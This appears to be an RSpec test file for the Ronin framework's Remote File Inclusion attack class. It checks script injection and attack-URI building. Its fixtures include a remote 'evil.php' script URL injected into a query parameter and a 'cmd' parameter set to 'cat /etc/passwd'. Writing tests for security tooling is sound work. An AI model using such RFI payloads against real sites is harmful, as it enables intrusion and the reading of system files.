require 'spec_helper'
require 'ronin/attacks/rfi'

describe Attacks::RFI do
  let(:query_param)   { 'q' }
  let(:original_data) { 'foo' }

  let(:uri)         { URI("http://www.example.com/page.php?#{query_param}=#{original_data}") }
  let(:url)         { URL.from(uri) }

  let(:test_script) { 'http://www.example.com/rfi_test.php' }
  let(:script)      { 'http://www.example.com/evil.php?q=1' }

  let(:attack) do
    described_class.new(
      :url           => url,
      :query_param   => query_param,
      :original_data => original_data,
      :terminate     => true
    )
  end
  subject { attack }

  describe "test_script" do
    subject { described_class.test_script }

    it "should have a default value" do
      subject.should_not be_nil
    end

    it "should be publically accessible" do
      Net::HTTP.get_response(subject).code.should == '200'
    end
  end

  describe "test_script=" do
    subject { described_class }

    after(:all) do
      subject.test_script = described_class::TEST_SCRIPT
    end

    it "should accept URIs" do
      subject.test_script = URI(test_script)

      subject.test_script.should == URI(test_script)
    end

    it "should convert Strings to URIs" do
      subject.test_script = test_script

      subject.test_script.should == URI(test_script)
    end
  end

  describe "#initialize" do
    subject { described_class.new(:test_script => test_script) }

    it "should accept a :test_script option" do
      subject.test_script.should == test_script
    end
  end

  describe "#inject" do
    it "should inject the script" do
      subject.inject(script).should be_start_with(script)
    end

    it "should allow terminating the script URI with a '?'" do
      subject.inject(script).should be_end_with('?')
    end
  end

  describe "#attack_uri" do
    let(:param_name)  { 'cmd' }
    let(:param_value) { 'cat /etc/passwd' }

    subject { attack.attack_uri(script, param_name => param_value) }

    it "should merge any additional query params into the attack URI" do
      subject.query_params[param_name].should == param_value
    end
  end
end
